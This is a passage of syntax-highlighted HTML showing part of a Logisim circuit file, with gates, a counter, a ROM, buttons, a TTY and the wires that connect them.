&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(290,380)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;NOT Gate&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;facing&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;north&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(300,340)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Controlled Buffer&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(320,540)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;NOR Gate&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;facing&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;west&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;inputs&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;4&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(320,300)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Counter&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;appearance&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;classic&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;4&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(340,290)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ROM&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;appearance&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;classic&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;5&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(140,370)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Button&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;label&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;rst&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;5&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(710,200)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;TTY&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;cols&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;40&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;5&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(710,260)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Button&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;label&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;tty_rst&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(140,300)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(160,300)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(140,370)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(310,370)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(160,300)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(160,340)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(160,340)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(280,340)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(290,350)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(290,380)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(290,410)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(290,540)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(290,540)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(320,540)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(300,320)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(300,340)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(300,340)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(330,340)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(310,320)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(310,370)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(320,300)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(340,300)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
